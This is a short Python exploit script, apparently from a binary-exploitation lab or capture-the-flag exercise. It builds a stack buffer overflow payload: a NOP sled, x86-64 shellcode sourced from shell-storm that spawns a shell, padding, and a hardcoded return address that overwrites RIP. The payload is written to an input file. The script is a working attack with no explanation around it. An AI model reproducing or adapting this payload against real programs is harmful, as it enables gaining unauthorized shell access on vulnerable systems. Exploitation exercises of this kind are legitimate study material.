#!/usr/bin/env python
from struct import *

# http://shell-storm.org/shellcode/files/shellcode-806.php
buf = ""
buf += "\x90"*200                     # NOP
buf += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
buf += "A"*821 

buf += pack("<Q", 0x7fffffffd844)     # overwrite RIP with the buffer address

f = open("./../in.txt", "w")
f.write(buf)
